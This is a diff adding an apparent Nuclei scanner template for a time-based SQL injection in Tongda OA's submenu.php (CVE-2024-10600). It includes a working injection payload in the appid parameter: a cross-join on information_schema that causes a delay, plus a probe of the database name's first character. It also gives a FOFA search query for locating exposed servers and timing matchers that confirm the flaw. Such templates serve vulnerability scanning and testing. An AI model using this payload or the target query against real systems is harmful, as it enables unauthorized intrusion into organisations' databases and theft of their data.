@@ -1,0 +1,39 @@
+id: tongda-oa-submenu-sqli
+info:
+  name: 通达 OA 前台 submenu.php - sqli
+  author: leadlife
+  severity: high
+  description: pda/appcenter/submenu.php 未包含inc/auth.inc.php且 $appid 参数未用'包裹导致前台SQL注入
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0submenu.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-10600).md
+  classification:
+    cve-id: 2024-10600
+  metadata:
+    verified: true
+    fofa-query: app="TDXK-通达OA" && icon_hash="-759108386"
+    hunter-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version: v2017-v11.6
+  tags: 2024,sqli,time,tongda,oa
+
+http:
+  - raw:  
+      - |
+        @timeout: 7s
+        GET /pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        @timeout: 7s
+        GET /pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'用户未登录','pda')
+          - status_code == 200
+          - duration >= 3 && duration < 5
+        condition: and
